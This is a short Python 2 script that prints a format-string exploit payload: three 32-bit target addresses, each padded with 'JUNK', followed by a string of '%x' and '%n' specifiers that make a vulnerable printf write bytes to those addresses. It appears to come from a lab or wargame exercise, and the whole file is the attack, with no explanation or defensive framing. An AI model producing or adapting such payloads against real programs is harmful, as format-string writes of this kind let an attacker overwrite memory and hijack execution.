#!/usr/bin/python

w1 = '\x14\xc0\x04\x08JUNK'
w2 = '\x15\xc0\x04\x08JUNK'
w3 = '\x16\xc0\x04\x08JUNK'
form = '%x%x%x%n%x%n%x%n'

print w1 + w2 + w3 + form
